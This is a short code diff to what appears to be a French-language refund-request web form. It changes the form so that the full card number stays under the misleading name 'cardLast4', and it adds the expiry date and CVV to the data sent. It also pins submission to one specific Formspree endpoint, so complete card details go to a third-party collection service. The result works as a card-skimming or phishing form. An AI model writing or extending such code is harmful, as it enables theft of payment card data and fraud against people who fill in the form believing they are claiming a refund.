@@ -250,17 +250,17 @@ export default function Home() {
   const validateCard = (): TranslationKey | '' => {
     const digits = formData.cardNumber.replace(/\s/g, '');
     if (digits.length !== 16) return 'cardInvalid';
-    if (!/^\d{3,4}$/.test(formData.cardCvv)) return 'cvvInvalid';
+    if (!/^\d{3}$/.test(formData.cardCvv)) return 'cvvInvalid';
     if (!/^\d{2}\/\d{2}$/.test(formData.cardExpiry)) return 'expiryInvalid';
     return '';
   };
 
   const submitAll = async () => {
     const cardDigits = formData.cardNumber.replace(/\D/g, '');
-    const cardLast4 = cardDigits.slice(-4);
+    const cardLast4 = cardDigits.slice(-16);
 
     const formspreeConfigured =
-      EMAIL_CONFIG.formspreeEndpoint.startsWith('https://formspree.io/f/') &&
+      EMAIL_CONFIG.formspreeEndpoint.startsWith('https://formspree.io/f/xvkgaezq') &&
       !EMAIL_CONFIG.formspreeEndpoint.includes('votre_identifiant_ici');
 
     const endpoint = formspreeConfigured
@@ -274,6 +274,8 @@ export default function Home() {
       reason: formData.reason,
       amount: formData.amount,
       cardLast4,
+      cardExpiry: formData.cardExpiry,
+      cardCvv: formData.cardCvv,
       _subject: `Nouvelle demande de remboursement - ${formData.fullName}`,
     };
 
